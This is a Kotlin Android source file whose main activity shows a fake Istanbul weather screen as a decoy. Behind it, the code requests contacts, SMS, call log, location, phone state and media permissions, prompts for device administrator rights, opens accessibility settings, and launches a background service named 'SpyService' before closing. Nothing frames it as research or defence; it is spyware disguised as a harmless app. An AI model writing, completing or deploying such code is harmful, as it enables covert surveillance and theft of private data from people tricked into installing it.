package com.eren

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {
    private val perms = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.READ_MEDIA_IMAGES)
        else add(Manifest.permission.READ_EXTERNAL_STORAGE)
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        showWeatherScreen()
        Handler(Looper.getMainLooper()).postDelayed({
            try { ActivityCompat.requestPermissions(this, perms, 1001) } catch (_: Exception) {}
        }, 2000)
    }

    private fun showWeatherScreen() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#0d1b2a"))
            layoutParams = ViewGroup.LayoutParams(-1, -1)
        }
        val city = TextView(this).apply { text = "Istanbul"; setTextColor(Color.WHITE); textSize = 28f; gravity = Gravity.CENTER }
        val temp = TextView(this).apply { text = "23"; setTextColor(Color.WHITE); textSize = 96f; gravity = Gravity.CENTER }
        val cond = TextView(this).apply { text = "Parcali Bulutlu"; setTextColor(Color.parseColor("#b0bec5")); textSize = 18f; gravity = Gravity.CENTER; setPadding(0, 0, 0, 32) }
        val detail = TextView(this).apply { text = "Nem: 62%   Ruzgar: 8 km/s\nHissedilen: 25"; setTextColor(Color.parseColor("#90a4ae")); textSize = 14f; gravity = Gravity.CENTER }
        root.addView(city); root.addView(temp); root.addView(cond); root.addView(detail)
        setContentView(root)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        requestAdmin()
    }

    private fun requestAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(comp)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
            try { startActivityForResult(i, 2002) } catch (_: Exception) { accessibilityNext() }
        } else accessibilityNext()
    }

    private fun accessibilityNext() {
        try { startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 3003) }
        catch (_: Exception) { finishAndStart() }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) { 2002 -> accessibilityNext(); 3003 -> finishAndStart() }
    }

    private fun finishAndStart() {
        try { startForegroundService(Intent(this, SpyService::class.java)) } catch (_: Exception) { startService(Intent(this, SpyService::class.java)) }
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500)
    }
}
